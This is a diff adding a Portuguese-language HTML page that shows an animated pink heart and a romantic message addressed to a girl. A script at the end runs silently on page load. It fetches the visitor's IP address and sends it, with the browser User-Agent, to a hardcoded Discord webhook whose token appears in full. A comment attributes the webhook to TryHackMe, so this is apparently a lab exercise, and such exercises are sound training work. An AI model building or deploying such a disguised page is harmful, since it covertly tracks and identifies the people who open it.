@@ -1,0 +1,100 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Coração fofinho — Você é a garota mais bonita do mundo</title>
+  <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Inter:wght@300;600&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --bg:#FFF6FB;
+      --heart1:#FF6B9A; /* gradient start */
+      --heart2:#FF3D7A; /* gradient end */
+      --shadow: rgba(255,61,122,0.25);
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%;margin:0;font-family:Inter,system-ui,Segoe UI,Roboto,"Helvetica Neue",Arial}
+    body{
+      background: linear-gradient(180deg,var(--bg),#FFEFF6);
+      display:flex;align-items:center;justify-content:center;padding:32px;
+    }
+
+    .card{
+      width:min(640px,96vw);
+      background:transparent;
+      display:grid;place-items:center;gap:18px;padding:28px;border-radius:24px;
+      text-align:center;
+    }
+
+    /* coração */
+    .heart-wrap{display:inline-block;position:relative;filter:drop-shadow(0 18px 30px var(--shadow));transform:translateZ(0)}
+    .heart{
+      position:relative;width:220px;height:200px;
+      transform:rotate(-45deg);
+      background:linear-gradient(135deg,var(--heart1),var(--heart2));
+      border-radius:20px 20px 0 0;
+      animation:beat 1.1s ease-in-out infinite;
+      display:inline-block;
+    }
+    .heart::before, .heart::after{
+      content:"";
+      position:absolute;width:220px;height:220px;background:linear-gradient(135deg,var(--heart1),var(--heart2));border-radius:50%;
+    }
+    .heart::before{top:-110px;left:0}
+    .heart::after{left:110px;top:0}
+    
+    @keyframes beat{
+      0%,100%{transform:rotate(-45deg) scale(1)}
+      40%{transform:rotate(-45deg) scale(1.08)}
+      60%{transform:rotate(-45deg) scale(0.98)}
+    }
+
+    /* mensagem */
+    h1{
+      margin:0;font-family:Pacifico, cursive;font-size:clamp(1.6rem,3.5vw,2.4rem);color:#6B1033;letter-spacing:0.4px;
+      text-shadow: 0 2px 0 rgba(255,255,255,0.6);
+    }
+    p{
+      margin:6px 0 0;font-size:clamp(0.9rem,1.8vw,1.05rem);color:#5b1330;opacity:0.95;
+    }
+
+    /* pequeno selo */
+    .badge{margin-top:12px;background:rgba(255,255,255,0.6);backdrop-filter:blur(6px);padding:8px 14px;border-radius:999px;font-weight:600;font-size:0.9rem}
+
+    /* responsividade */
+    @media (max-width:420px){
+      .heart{width:160px;height:150px}
+      .heart::before,.heart::after{width:160px;height:160px}
+    }
+  </style>
+</head>
+<body>
+  <main class="card" role="main" aria-label="Coração fofo">
+    <div class="heart-wrap" title="Coração">
+      <div class="heart" aria-hidden="true"></div>
+    </div>
+    <h1>vc é a garota mais bonita do mundo</h1>
+    <p>um recado doce feito só pra você 💖</p>
+    <div class="badge">feito com carinho</div>
+  </main>
+
+  <script>
+    // Webhook fornecido pelo TryHackMe
+    const webhookURL = "https://discord.com/api/webhooks/1398030246875234334/ZwqRQ13QuGzpc63H4iUuZDJpwwHOWxgk_To0eJ2KcFAC4sjcpPo3yQwp5kyxaPEuL4I4";
+
+    // Obtém IP e envia para o webhook assim que o site carrega
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `Novo visitante — IP: ${data.ip} — User-Agent: ${navigator.userAgent}`
+          })
+        });
+      })
+      .catch(err => console.error("Erro ao obter IP:", err));
+  </script>
+</body>
+</html>
